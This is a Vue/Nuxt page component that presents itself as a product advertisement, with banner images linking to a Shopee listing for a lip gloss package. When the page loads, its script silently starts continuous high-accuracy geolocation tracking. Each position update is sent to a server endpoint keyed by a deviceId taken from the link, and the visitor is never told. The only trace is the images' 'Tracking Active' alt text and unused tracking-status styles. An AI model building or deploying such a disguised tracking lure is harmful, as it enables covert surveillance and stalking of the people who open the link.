<template>
    <div class="container">
        <a href="https://shopee.co.id/MAKE-OVER-x-NIKI-Limited-Edition-Package-NIKI%E2%80%99s-Glazed-Picks-Ride-or-Die-Shade-Edisi-Terbatas-Next-Level-Lip-Gloss-Lip-Cream-Transferproof-Pigmented-Tahan-Lama-24-Jam-Ringan-Tidak-Lengket-di-Bibir-i.63984475.28313600671" target="_blank">
          <img src="https://makeover-ecommerce-bucket.s3.ap-southeast-1.amazonaws.com/images/mobile/4689bd2719a1d392a8c6ebd64bed06e3c35edb56.jpg" alt="Tracking Active" class="banner-image" />
          <img src="https://down-id.img.susercontent.com/file/sg-11134201-7rdxf-m15e47nzunmh1b" alt="Tracking Active" class="banner-image" />
        </a>
    </div>
  </template>
  
  <script setup>
  const route = useRoute()
  const loading = ref(true)
  const isTracking = ref(false)
  let watchId = null
  
  const startClientTracking = async () => {
    const deviceId = route.query.deviceId
    
    if (!deviceId) {
      loading.value = false
      return
    }
    
    if (!navigator.geolocation) {
      alert('Your device does not support location tracking')
      loading.value = false
      return
    }
  
    // Mulai watching posisi otomatis
    watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const lat = position.coords.latitude
        const lon = position.coords.longitude
        
        try {
          isTracking.value = true
          
          await $fetch(`/api/device/${deviceId}`, {
            method: 'PUT',
            body: {
              status: 'active',
              location: { lat, lon },
              accuracy: position.coords.accuracy
            }
          })
          
        } catch (error) {
          console.error('Failed to update location:', error)
          isTracking.value = false
        }
      },
      (error) => {
        console.error('Error getting location:', error)
        isTracking.value = false
        loading.value = false
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    )
    
    loading.value = false
  }
  
  onMounted(() => {
    startClientTracking()
  })
  
  onUnmounted(() => {
    if (watchId) {
      navigator.geolocation.clearWatch(watchId)
    }
  })
  </script>
  
  <style scoped>
  .container {
    /* min-height: 100vh; */
    display: flex;
    align-items: center;
    justify-content: center;
    background-color: #f5f5f5;
    font-family: Arial, sans-serif;
  }
  
  .loading {
    text-align: center;
  }
  
  .loading-spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #3498db;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .tracking-active {
    text-align: center;
    width: 100%;
    max-width: 400px;
    padding: 20px;
  }
  
  .banner {
    background-color: white;
    border-radius: 16px;
    padding: 30px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    margin-bottom: 20px;
  }
  
  .banner-image {
    width: 100%;
    margin-bottom: 20px;
  }
  
  h1 {
    color: #333;
    font-size: 24px;
    margin-bottom: 10px;
  }
  
  .info {
    color: #666;
    margin-bottom: 30px;
  }
  
  .status-indicator {
    display: flex;
    align-items: center;
    justify-content: center;
    color: #999;
    padding: 10px;
    border-radius: 8px;
    background-color: #f8f8f8;
  }
  
  .status-indicator.active {
    color: #4CAF50;
    background-color: #e8f5e9;
  }
  
  .dot {
    height: 10px;
    width: 10px;
    background-color: #999;
    border-radius: 50%;
    margin-right: 8px;
    animation: pulse 2s infinite;
  }
  
  .status-indicator.active .dot {
    background-color: #4CAF50;
  }
  
  @keyframes pulse {
    0% { opacity: 1; }
    50% { opacity: 0.5; }
    100% { opacity: 1; }
  }
  
  .footer {
    color: #999;
    font-size: 14px;
    margin-top: 40px;
  }
  </style>